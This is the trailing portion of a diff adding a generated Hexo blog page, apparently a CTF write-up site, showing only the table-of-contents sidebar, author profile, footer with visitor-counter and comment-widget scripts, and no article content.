<span class="nav-text">Start_choose函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SThj8"><span class="nav-number">3.2.2.</span> <span class="nav-text">case1 ：Store</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nz0qf"><span class="nav-number">3.2.3.</span> <span class="nav-text">case 2 : out</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dtk36"><span class="nav-number">3.2.4.</span> <span class="nav-text">case 3 : Status</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sYL4q"><span class="nav-number">3.2.5.</span> <span class="nav-text">case 4 : ex1t</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ci7r5"><span class="nav-number">3.2.6.</span> <span class="nav-text">case 666 : gift</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#YrD4o"><span class="nav-number">3.3.</span> <span class="nav-text">0x2 思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JvWYa"><span class="nav-number">3.4.</span> <span class="nav-text">0X3 exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#temp"><span class="nav-number">4.</span> <span class="nav-text">temp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#wahahabox"><span class="nav-number">5.</span> <span class="nav-text">wahahabox</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xswlhhh"
+      src="/images/myavatar.jpg">
+  <p class="site-author-name" itemprop="name">xswlhhh</p>
+  <div class="site-description" itemprop="description">用最少的时间做无关的事，用最多的时间做紧要的事</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/2991796382@qq.com" title="E-Mail → 2991796382@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xswlhhh</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">197k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:59</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+</body>
+</html>
